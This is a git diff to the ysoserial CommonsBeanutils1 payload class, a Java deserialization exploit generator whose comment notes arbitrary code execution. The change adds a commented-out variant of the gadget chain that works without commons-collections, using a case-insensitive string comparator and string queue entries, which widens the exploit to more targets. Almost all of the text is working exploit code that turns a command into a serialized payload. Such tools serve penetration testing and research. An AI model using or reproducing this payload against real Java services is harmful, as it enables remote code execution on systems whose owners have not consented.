@@ -22,7 +22,7 @@ import ysoserial.payloads.util.Reflections;
                                 任意代码执行
  */
 @SuppressWarnings({ "rawtypes", "unchecked" })
-@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
+@Dependencies({"commons-beanutils:commons-beanutils:1.9.2||1.8.3(nocc)", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
 @Authors({ Authors.FROHOFF })
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
@@ -30,12 +30,16 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("lowestSetBit");
+        //final BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
 
 		// create queue with numbers and basic comparator
 		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
 		// stub data for replacement later
 		queue.add(new BigInteger("1"));
 		queue.add(new BigInteger("1"));
+        //No-CC
+        //queue.add("1");
+        //queue.add("1");
 
 		// switch method called by comparator
 		Reflections.setFieldValue(comparator, "property", "outputProperties");
